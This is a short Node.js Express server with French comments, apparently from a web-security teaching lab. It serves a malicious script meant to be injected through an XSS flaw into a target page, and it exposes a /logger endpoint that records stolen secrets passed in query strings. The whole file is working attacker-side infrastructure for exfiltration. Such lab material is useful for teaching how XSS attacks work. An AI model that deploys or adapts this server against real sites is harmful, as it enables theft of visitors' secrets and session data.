var express = require('express')
var app = express();

// Gestionnaire pour servir le JS malveillant au navigateur
// Notre but c'est d'injecter la balise
//   <script src="....c9user.io/"></script>
// Dans une page avec une faille XSS. Cette page, par exemple:
//   http://defeo.lu/aws/assets/secret-xss
app.get('/', function(req, res) {
    res.sendFile(__dirname + '/secret-client.js');
});

// Gestionnaire pour logguer tout secret volé
app.get('/logger', function(req, res) {
    console.log(req._parsedUrl.query);
    res.send('Merci!');
});

app.listen(process.env.PORT);
